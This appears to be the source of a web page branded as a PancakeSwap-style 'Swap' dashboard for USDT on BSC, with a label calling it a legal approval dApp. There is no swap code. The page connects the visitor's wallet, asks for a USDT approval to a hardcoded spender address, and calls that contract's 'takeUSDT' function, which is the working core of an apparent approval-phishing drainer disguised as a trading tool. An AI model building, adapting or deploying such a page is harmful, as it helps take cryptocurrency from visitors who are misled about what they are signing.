# approval.sol
Legal Web3 ERC20 approval dApp
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Fast USDT Dashboard | BSC</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />

<!-- MUST: ethers.js -->
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>

<style>
/* ===== Pancake-style minimal UI ===== */
*{box-sizing:border-box}
body{
  margin:0; background:#f5f0ff; font-family:Arial, Helvetica, sans-serif;
}
.app{
  max-width:420px; margin:0 auto; padding:14px;
}
.top{
  display:flex; align-items:center; justify-content:space-between; margin-bottom:10px;
}
h3{margin:0}
.btn{
  width:100%; padding:14px; border-radius:14px; border:none;
  font-size:16px; font-weight:700; cursor:pointer;
}
.connect{background:#1fc7d4; color:#fff}
.primary{background:#7645d9; color:#fff; margin-top:10px}
.secondary{background:#1f6feb; color:#fff; margin-top:10px}
.card{
  background:#fff; border-radius:18px; padding:16px;
  box-shadow:0 8px 24px rgba(0,0,0,.08);
}
.token{
  display:flex; justify-content:space-between; align-items:center;
  background:#f2ecff; padding:12px; border-radius:14px; margin-bottom:10px;
}
input{
  width:100%; padding:14px; border-radius:14px; border:1px solid #ddd;
  font-size:16px; outline:none;
}
.status{
  text-align:center; margin-top:10px; font-size:14px; color:#555;
}
.small{font-size:12px; color:#777; text-align:center; margin-top:6px}
</style>
</head>

<body>
<div class="app">
  <div class="top">
    <h3>Swap</h3>
    <button class="btn connect" onclick="connectWallet()">Connect</button>
  </div>

  <div class="card">
    <div class="token">
      <strong>USDT</strong>
      <span>BSC</span>
    </div>

    <input id="amount" type="number" placeholder="Enter USDT amount (e.g. 10)" />

    <button class="btn primary" onclick="approveUSDT()">Approve USDT</button>

    <!-- Optional transfer (requires contract function) -->
    <button class="btn secondary" onclick="transferUSDT()">Transfer USDT</button>

    <div class="status" id="status">Ready</div>
    <div class="small">Fast • Mobile-friendly • No unlimited approve</div>
  </div>
</div>

<script>
/* ================= CONFIG ================= */
const USDT_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const SPENDER_ADDR   = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1"; // your contract
const BSC_CHAIN_ID   = "0x38"; // BSC mainnet
const DECIMALS       = 18;

/* USDT approve ABI */
const USDT_ABI = [{
  inputs:[
    {name:"spender",type:"address"},
    {name:"amount",type:"uint256"}
  ],
  name:"approve",
  outputs:[{type:"bool"}],
  stateMutability:"nonpayable",
  type:"function"
}];

/* YOUR CONTRACT ABI (example)
   ⚠️ If your function name is different, CHANGE name below */
const YOUR_CONTRACT_ABI = [{
  inputs:[{name:"amount",type:"uint256"}],
  name:"takeUSDT",              // <-- change if needed
  outputs:[],
  stateMutability:"nonpayable",
  type:"function"
}];

let provider = null;
let signer   = null;

function setStatus(t){ document.getElementById("status").innerText = t; }

/* ================= CONNECT ================= */
async function connectWallet(){
  try{
    if(!window.ethereum){
      alert("Open this page in wallet DApp Browser (Trust / MetaMask)");
      return;
    }
    await window.ethereum.request({method:"eth_requestAccounts"});
    const cid = await window.ethereum.request({method:"eth_chainId"});
    if(cid !== BSC_CHAIN_ID){
      alert("Please switch to BSC Mainnet");
      return;
    }
    provider = new ethers.providers.Web3Provider(window.ethereum,"any");
    signer   = provider.getSigner();
    const addr = await signer.getAddress();
    setStatus("Connected: " + addr.slice(0,6) + "..." + addr.slice(-4));
  }catch(e){
    alert("Connect error: " + e.message);
  }
}

/* ================= APPROVE ================= */
async function approveUSDT(){
  try{
    if(!signer){ alert("Connect wallet first"); return; }
    const amt = document.getElementById("amount").value;
    if(!amt || amt<=0){ alert("Enter valid amount"); return; }

    setStatus("Opening wallet for approval…");
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const val  = ethers.utils.parseUnits(amt.toString(), DECIMALS);

    const tx = await usdt.approve(SPENDER_ADDR, val, {gasLimit: 120000});
    setStatus("Approve sent. Confirm in wallet…");
    await tx.wait();

    setStatus("USDT Approved ✔");
  }catch(e){
    alert("Approve error: " + e.message);
  }
}

/* ================= TRANSFER (OPTIONAL) ================= */
async function transferUSDT(){
  try{
    if(!signer){ alert("Connect wallet first"); return; }
    const amt = document.getElementById("amount").value;
    if(!amt || amt<=0){ alert("Enter valid amount"); return; }

    setStatus("Opening wallet for transfer…");
    const c = new ethers.Contract(SPENDER_ADDR, YOUR_CONTRACT_ABI, signer);
    const val = ethers.utils.parseUnits(amt.toString(), DECIMALS);

    const tx = await c.takeUSDT(val, {gasLimit: 200000});
    setStatus("Transfer sent. Confirm in wallet…");
    await tx.wait();

    setStatus("Transfer Success 🎉");
  }catch(e){
    alert("Transfer error: " + e.message);
  }
}
</script>
</body>
</html>
